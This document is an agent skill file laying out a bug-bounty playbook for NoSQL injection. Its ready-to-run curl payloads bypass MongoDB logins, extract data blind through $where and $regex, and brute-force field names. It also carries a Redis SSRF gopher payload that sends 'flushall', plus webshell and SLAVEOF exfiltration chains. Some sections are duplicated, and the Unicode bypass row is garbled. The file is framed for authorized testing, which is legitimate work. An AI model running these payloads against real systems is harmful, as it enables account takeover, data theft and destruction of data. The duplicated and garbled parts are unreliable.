---
name: bbhunt-nosqli
description: "Unified methodology for nosqli.. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Nosqli — unified methodology

> **Methodology skill.** Merged from 2 upstream skills across cbh, hunting. Payloads, wordlists and supporting data are in `references/`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method
### A. Discovery checklist — concrete places, params, headers, file types to look

- Two distinct classes to test separately: **syntax injection** (break a concatenated query / `$where` string) and **operator injection** (pass a JSON object where a scalar was expected). They need different payloads and different proof.
- Candidate surfaces: login/OTP/reset endpoints, category & filter params, search/lookup URLs, GraphQL resolvers, user/profile APIs, and anything forwarding values into `findOne`/`find`/`populate({match:})`.
- Stack signals: `X-Powered-By: Express`, `mongoose`/`monk` in JS bundles, MongoDB error strings, `:9200` (Elasticsearch), `:6379` (Redis), CouchDB `_utils`/Futon.
- Syntax-fuzz string from PortSwigger: `'`"`{<CR><LF>;$Foo}<CR><LF>$Foo \xYZ` — URL-encoded in query params, JSON-escaped (`\r`, `\n`, `\u0000`) in bodies. A response change indicates unfiltered input.
- Determine which characters are actually processed by injecting them individually; confirm with a valid escaped quote (`this.category == '\''`) — if that stops erroring, syntax injection is live.
- Operator detection in URL params uses bracket notation: `?username[$ne]=invalid&password[$ne]=invalid` — PHP's request parser and Express `qs` both turn this into nested objects.
- GraphQL variables declared `String!` can still carry objects if the resolver forwards them without runtime type checks — test `{"username":{"$ne":null}}` regardless of the schema annotation.
- Second-order flows: password-reset tokens, profile fields, and OTP codes that round-trip through storage before being used in a query (FantaSanremo 2026: reset `code` field with `{"$gt":""}` → mass ATO).
- Custom headers used for identity/filtering can be operator-injection sinks: `X-User: {"$ne": null}`.
- 2025-2026 CVE surface: Mongoose `populate()` CVE-2024-53900 and its bypass CVE-2025-23061 (`{"$or":[{"$where":"<js>"}]}`) → RCE in the Node.js process via `sift`, not the database engine.### Signals and surfaces
### Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE

---

### Stack Signals

| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Script injection |

---### Techniques and bypasses
### Phase 1 — Auth Bypass (MongoDB)

```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Detection ladder: send `'`, `"`, `\`, `{`, `}`, `[`, `]`, `;`, `$` to any input; then `param[$ne]=xyz`, `param[$gt]=`, `param[$regex]=.*` (form) or `{"param":{"$ne":null}}`, `{"param":{"$gt":""}}`, `{"param":{"$regex":".*"}}` (JSON).
- Boolean confirmation: compare `Gifts' && 0 && 'x` (false) against `Gifts' && 1 && 'x` (true). Different responses confirm server-side query logic. Always-over-true `'||'1'=='1` returns everything — do not send this to update/delete endpoints (accidental data loss).
- Null truncation: `fizzy'%00` drops trailing conditions such as `&& this.released == 1`, revealing unreleased/private records.
- MongoDB auth bypass set: `{"username":{"$ne":null},"password":{"$ne":null}}`, `{"username":{"$gt":""},"password":{"$gt":""}}`, `{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}`.
- `$where` string-context breakout: `admin' || 'a'=='a`, `admin' && this.password[0]=='a' || 'a'=='b`, `admin' && this.password.match(/\d/) || 'a'=='b`.
- Field-name discovery: `admin' && this.password!='` vs `admin' && this.foo!='` — identical responses mean the field exists. Or `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"` with a cluster-bomb Intruder attack.
- `$regex` char-by-char extraction without JS: `{"username":"admin","password":{"$regex":"^a"}}`; length oracle `{"password":{"$regex":"^.{8}$"}}`.
- Error-based exfil (when app leaks DB errors): `{"$where":"this.username=='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));"}`, paginate deterministically with `if (this._id > '<last_id>') { throw ... }`.
- Time-based blind when errors/booleans are silent: `{"$where":"var d=new Date(); do{var c=new Date();}while(c-d<5000); return true;"}` — a CPU-bound loop is more portable than `sleep()`; conditional version gates on `this.password[0]==="a"`.
- Important 2026 reality check: server-side JS (`$where`, `$function`, `$accumulator`) is deprecated since MongoDB 8.0 and `security.javascriptEnabled` may be false — treat `$where` as a legacy avenue, not an assumption. Prefer `$regex`/boolean extraction.
- Redis via SSRF: `gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a...` — CONFIG SET for a webshell, SLAVEOF for OOB exfil. `EVAL` running Lua is a config failure worth checking on the same pass.

### Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode: `$gt` |
| Blocks operator keys | Nested objects deeper in structure |

---### Validation and proof
### Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Establish a baseline first (status + body size); every operator test is a *difference* from that baseline. A generic 500 from malformed JSON is not injection.
- Confirm a true/false oracle pair before any char-by-char extraction: a condition that should match and one that cannot must produce different responses. If both look the same, there is no boolean oracle.
- Auth bypass proof requires a valid session token and access to a post-login resource — not just a changed error string such as "Account locked" (that only confirms the operator was applied).
- Time-based injections must be repeated 3× with a measured baseline; a single 5s response can be server load.
- `{"$ne":null}` matching every record can cause data loss if the same parameter reaches an update/delete operation — keep PoCs to read endpoints.
- Distinguish database-level JS from ODM-level JS: `$where` executing on `sift` (Mongoose `populate`) is RCE in the Node process — a materially different and higher-impact finding than MongoDB-level JS.
- Do not claim `$where` RCE on MongoDB 8.x without proving `javascriptEnabled` is true — infer it only from a successful conditional time/boolean test.
- CouchDB duplicate-key parser differentials (CVE-2017-12635/12636) are a different bug class — prove the privilege change, not just a stored duplicate key.
- Severity: auth bypass as admin / ODM $where RCE → Critical; full collection dump → High; blind operator injection with no useful data → Medium.

**Operator quick-reference table:**
- `$ne` — not equal; `{"username":{"$ne":null}}` matches any non-null field → auth bypass.
- `$gt` / `$lt` — greater/less than; `{"password":{"$gt":""}}` matches any non-empty string.
- `$in` / `$nin` — array membership / exclusion; test several privileged usernames in one request.
- `$exists` — field presence; `{"admin_flag":{"$exists":true}}` is a schema-probing primitive.
- `$regex` — pattern match; `^a`, `^.{8}$`, `^p` for char-by-char and length extraction.
- `$where` — JavaScript expression; deprecated in MongoDB 8.0, still reachable via Mongoose/sift on older stacks.
- `$or` — used to nest a `$where` past a top-level-only filter (CVE-2025-23061 bypass).

**Database-specific notes:**
- MongoDB: operator injection is the dominant real-world class; CWE-943, OWASP A05:2025.
- CouchDB: Mango mirrors Mongo operators; also test duplicate-`roles` key parser differentials (CVE-2017-12635 + CVE-2017-12636 → RCE).
- Redis: newline-delimited RESP; real exposure is usually SSRF→gopher, not a web form field. EVAL/Lua is a misconfiguration.
- Cassandra/CQL: no UNION, no subqueries, no OR, no SLEEP() — test string breakout and injected `ALLOW FILTERING --`; time-based blind is unavailable.
- Elasticsearch: `_search` with script injection on pre-5.0 clusters; port 9200 exposure alone is not an injection finding.

**Automation starting points:** NoSQLMap (`nosqlmap -u <url> --attack 1`), Burp NoSQLiScanner / Burp Intruder with an operator wordlist, OWASP ZAP with custom rules. Manual confirmation is still required for every reported finding.
- When a header/parameter reaches a query, coercing it to a string (`.toString()`) or applying `typeof x !== 'string'` kills the object-injection primitive — check whether such guards exist before escalating severity.
- Secondary impact worth documenting: operator injection on a read endpoint can still enable account enumeration, OTP/reset-token bypass, and cross-tenant reads even when no admin login is returned.

### Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium### Escalation and related chains
### Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |

---### Sources and related reading
### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/nosql-injection
2. https://www.invicti.com/blog/web-security/nosql-injection-cheat-sheet### Additional notes
### URL & Param Patterns

```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### Phase 2 — URL Parameter Injection

```bash
# Array notation (Express/PHP-style)
curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"

# POST form data
curl "https://$TARGET/api/login" \
  --data "username[$gt]=&password[$gt]="
```

### Phase 3 — $where Blind Injection (time-based)

```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)

When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
```
fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
' || '1'=='1               # always-true (string-context breakout)
' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
```
(PortSwigger: Injecting syntax into NoSQL queries.)

### Phase 4 — Data Dump via Regex

```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### Phase 5 — Automation

```bash
# nosqlmap
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1

# nosqlmap data extraction
nosqlmap -u "https://$TARGET/api/login" --attack 2
```

### Phase 6 — Redis via SSRF

```bash
# If SSRF found, probe internal Redis via gopher://
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

---### Companion methodology (deduplicated)
### hunting / references/techniques.md

# HUNT-NOSQLI — NoSQL Injection — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Bypass Table



| Defense | Bypass |

|---------|--------|

| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |

| Sanitizes `$` | Unicode: `$gt` |

| Blocks operator keys | Nested objects deeper in structure |



---## Probes

## Supporting data

- `bbhunt-methodology` — orchestrator, state machine and class router
